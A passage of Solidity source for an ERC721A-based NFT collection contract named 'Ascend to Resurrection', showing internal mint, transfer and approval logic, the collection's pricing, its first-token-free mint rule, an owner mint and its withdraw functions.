1090         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1091 
1092         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1093 
1094         // Overflows are incredibly unrealistic.
1095         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1096         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1097         unchecked {
1098             _addressData[to].balance += uint128(quantity);
1099             _addressData[to].numberMinted += uint128(quantity);
1100 
1101             _ownerships[startTokenId].addr = to;
1102             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1103 
1104             uint256 updatedIndex = startTokenId;
1105 
1106             for (uint256 i; i < quantity; i++) {
1107                 emit Transfer(address(0), to, updatedIndex);
1108                 if (safe) {
1109                     require(
1110                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1111                         "ERC721A: transfer to non ERC721Receiver implementer"
1112                     );
1113                 }
1114 
1115                 updatedIndex++;
1116             }
1117 
1118             currentIndex = updatedIndex;
1119         }
1120 
1121         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1122     }
1123 
1124     /**
1125      * @dev Transfers `tokenId` from `from` to `to`.
1126      *
1127      * Requirements:
1128      *
1129      * - `to` cannot be the zero address.
1130      * - `tokenId` token must be owned by `from`.
1131      *
1132      * Emits a {Transfer} event.
1133      */
1134     function _transfer(
1135         address from,
1136         address to,
1137         uint256 tokenId
1138     ) private {
1139         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1140 
1141         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1142             getApproved(tokenId) == _msgSender() ||
1143             isApprovedForAll(prevOwnership.addr, _msgSender()));
1144 
1145         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1146 
1147         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1148         require(to != address(0), "ERC721A: transfer to the zero address");
1149 
1150         _beforeTokenTransfers(from, to, tokenId, 1);
1151 
1152         // Clear approvals from the previous owner
1153         _approve(address(0), tokenId, prevOwnership.addr);
1154 
1155         // Underflow of the sender's balance is impossible because we check for
1156         // ownership above and the recipient's balance can't realistically overflow.
1157         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1158         unchecked {
1159             _addressData[from].balance -= 1;
1160             _addressData[to].balance += 1;
1161 
1162             _ownerships[tokenId].addr = to;
1163             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1164 
1165             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1166             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1167             uint256 nextTokenId = tokenId + 1;
1168             if (_ownerships[nextTokenId].addr == address(0)) {
1169                 if (_exists(nextTokenId)) {
1170                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1171                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1172                 }
1173             }
1174         }
1175 
1176         emit Transfer(from, to, tokenId);
1177         _afterTokenTransfers(from, to, tokenId, 1);
1178     }
1179 
1180     /**
1181      * @dev Approve `to` to operate on `tokenId`
1182      *
1183      * Emits a {Approval} event.
1184      */
1185     function _approve(
1186         address to,
1187         uint256 tokenId,
1188         address owner
1189     ) private {
1190         _tokenApprovals[tokenId] = to;
1191         emit Approval(owner, to, tokenId);
1192     }
1193 
1194     /**
1195      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1196      * The call is not executed if the target address is not a contract.
1197      *
1198      * @param from address representing the previous owner of the given token ID
1199      * @param to target address that will receive the tokens
1200      * @param tokenId uint256 ID of the token to be transferred
1201      * @param _data bytes optional data to send along with the call
1202      * @return bool whether the call correctly returned the expected magic value
1203      */
1204     function _checkOnERC721Received(
1205         address from,
1206         address to,
1207         uint256 tokenId,
1208         bytes memory _data
1209     ) private returns (bool) {
1210         if (to.isContract()) {
1211             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1212                 return retval == IERC721Receiver(to).onERC721Received.selector;
1213             } catch (bytes memory reason) {
1214                 if (reason.length == 0) {
1215                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1216                 } else {
1217                     assembly {
1218                         revert(add(32, reason), mload(reason))
1219                     }
1220                 }
1221             }
1222         } else {
1223             return true;
1224         }
1225     }
1226 
1227     /**
1228      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1229      *
1230      * startTokenId - the first token id to be transferred
1231      * quantity - the amount to be transferred
1232      *
1233      * Calling conditions:
1234      *
1235      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1236      * transferred to `to`.
1237      * - When `from` is zero, `tokenId` will be minted for `to`.
1238      */
1239     function _beforeTokenTransfers(
1240         address from,
1241         address to,
1242         uint256 startTokenId,
1243         uint256 quantity
1244     ) internal virtual {}
1245 
1246     /**
1247      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1248      * minting.
1249      *
1250      * startTokenId - the first token id to be transferred
1251      * quantity - the amount to be transferred
1252      *
1253      * Calling conditions:
1254      *
1255      * - when `from` and `to` are both non-zero.
1256      * - `from` and `to` are never both zero.
1257      */
1258     function _afterTokenTransfers(
1259         address from,
1260         address to,
1261         uint256 startTokenId,
1262         uint256 quantity
1263     ) internal virtual {}
1264 }
1265 
1266 contract AscendtoResurrection is ERC721A, Ownable, ReentrancyGuard {
1267     string public baseURI = "ipfs://QmeyghUexPb1WQe3jd3p3SJXq2JjMuB7LA9nUuChBPDueZ/";
1268     uint   public price             = 0.004 ether;
1269     uint   public maxPerTx          = 20;
1270     uint   public maxPerFree        = 1;
1271     uint   public totalFree         = 6000;
1272     uint   public maxSupply         = 6000;
1273 
1274     mapping(address => uint256) private _mintedFreeAmount;
1275 
1276     constructor() ERC721A("Ascend to Resurrection", "ATR"){}
1277 
1278 
1279     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1280         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1281         string memory currentBaseURI = _baseURI();
1282         return bytes(currentBaseURI).length > 0
1283             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1284             : "";
1285     }
1286 
1287     function mint(uint256 count) external payable {
1288         uint256 cost = price;
1289         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1290             (_mintedFreeAmount[msg.sender] < maxPerFree));
1291 
1292         if (isFree) {
1293             require(msg.value >= (count * cost) - cost, "INVALID_ETH");
1294             require(totalSupply() + count <= maxSupply, "No more");
1295             require(count <= maxPerTx, "Max per TX reached.");
1296             _mintedFreeAmount[msg.sender] += count;
1297         }
1298         else{
1299         require(msg.value >= count * cost, "Please send the exact amount.");
1300         require(totalSupply() + count <= maxSupply, "No more");
1301         require(count <= maxPerTx, "Max per TX reached.");
1302         }
1303 
1304         _safeMint(msg.sender, count);
1305     }
1306 
1307     function Ascend(address mintAddress, uint256 count) public onlyOwner {
1308         _safeMint(mintAddress, count);
1309     }
1310 
1311     function _baseURI() internal view virtual override returns (string memory) {
1312         return baseURI;
1313     }
1314 
1315     function setBaseUri(string memory baseuri_) public onlyOwner {
1316         baseURI = baseuri_;
1317     }
1318 
1319     function setPrice(uint256 price_) external onlyOwner {
1320         price = price_;
1321     }
1322 
1323     function withdraw() external onlyOwner nonReentrant {
1324         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1325         require(success, "Transfer failed.");
1326     }
1327 }